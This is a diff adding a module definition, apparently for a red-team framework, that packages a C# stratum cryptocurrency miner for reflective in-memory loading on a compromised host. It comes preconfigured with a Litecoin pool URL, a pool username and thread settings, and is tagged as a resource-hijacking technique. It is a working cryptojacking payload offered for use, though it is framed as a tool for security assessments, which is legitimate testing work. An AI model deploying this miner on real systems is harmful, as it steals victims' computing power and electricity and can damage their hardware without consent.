@@ -1,0 +1,139 @@
+name: StratumMiner
+authors:
+  - name: Anthony Rose
+    handle: Cx01N
+    link: https://twitter.com/Cx01N_
+description: |
+  A .NET implementation of a stratum miner in C# which can be reflectively
+  loaded. Intended for demonstration of cryptojacking attacks during an assessment.
+  Will cause a spike in resource usage and may cause temperature rises in hardware
+  if left running for prolonged periods.
+software: ''
+tactics: [TA0040]
+techniques: [T1496.001]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+options:
+  - name: URL
+    description: URL for mining pool.
+    required: true
+    value: stratum+tcp://us.litecoinpool.org:3333
+    strict: false
+    suggested_values: []
+  - name: Username
+    description: Username for mining pool.
+    required: true
+    value: dredg066.1
+    strict: false
+    suggested_values: []
+  - name: Password
+    description: Password for mining pool.
+    required: true
+    value: 1
+    strict: false
+    suggested_values: []
+  - name: Threads
+    description: Number of threads to run.
+    required: true
+    value: 4
+    strict: false
+    suggested_values: []
+csharp:
+  UnsafeCompile: false
+  CompatibleDotNetVersions:
+    - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using System.Reflection;
+    using DotNetStratumMiner;
+
+    public static class Program
+    {
+        public static void Main(string[] args)
+        {
+            string url = args.Length > 0 ? args[0] : "";
+            string username = args.Length > 1 ? args[1] : "";
+            string password = args.Length > 2 ? args[2] : "";
+            string threads = args.Length > 3 ? args[3] : "";
+
+            string result = StartStratumMiner(url, username, password, threads);
+            Console.WriteLine(result);
+        }
+
+        public static string StartStratumMiner(string url, string username, string password, string threads)
+        {
+            using (StringWriter stringWriter = new StringWriter())
+            {
+                try
+                {
+                    AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
+                    {
+                        string resourceName = "Replicon.Cryptography.SCrypt.dll";
+                        using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                        {
+                            if (stream != null)
+                            {
+                                byte[] assemblyData = new byte[stream.Length];
+                                stream.Read(assemblyData, 0, assemblyData.Length);
+                                return Assembly.Load(assemblyData);
+                            }
+                        }
+                        stringWriter.WriteLine("Failed to load: " + resourceName);
+                        return null;
+                    };
+
+                    stringWriter.WriteLine("Starting Stratum Miner");
+                    string[] minerArgs = { "-o " + url, "-u " + username, "-p " + password, "-t " + threads };
+
+                    DotNetStratumMiner.Program.Main(minerArgs);
+
+                    stringWriter.WriteLine("Stratum Miner execution finished.");
+                }
+                catch (Exception e)
+                {
+                    stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
+                }
+
+                return stringWriter.ToString();
+            }
+        }
+    }
+  ReferenceSourceLibraries:
+    - Name: DotNetStratumMiner
+      Description: A .NET implementation of a stratum miner in C#.
+      Location: DotNetStratumMiner\
+      Language: CSharp
+      CompatibleDotNetVersions:
+        - Net40
+      ReferenceAssemblies:
+        - Name: System.dll
+          Location: net40\System.dll
+          DotNetVersion: Net40
+        - Name: System.Core.dll
+          Location: net40\System.Core.dll
+          DotNetVersion: Net40
+        - Name: mscorlib.dll
+          Location: net40\mscorlib.dll
+          DotNetVersion: Net40
+        - Name: System.Runtime.Serialization.dll
+          Location: net40\System.Runtime.Serialization.dll
+          DotNetVersion: Net40
+        - Name: System.XML.dll
+          Location: net40\System.XML.dll
+          DotNetVersion: Net40
+        - Name: Replicon.Cryptography.SCrypt.dll
+          Location: net40\Replicon.Cryptography.SCrypt.dll
+          DotNetVersion: Net40
+        - Name: System.Management.dll
+          Location: net40\System.Management.dll
+          DotNetVersion: Net40
+      EmbeddedResources:
+        - Name: Replicon.Cryptography.SCrypt.dll
+          Location: Replicon.Cryptography.SCrypt.dll
+  ReferenceAssemblies: []
+  EmbeddedResources: []
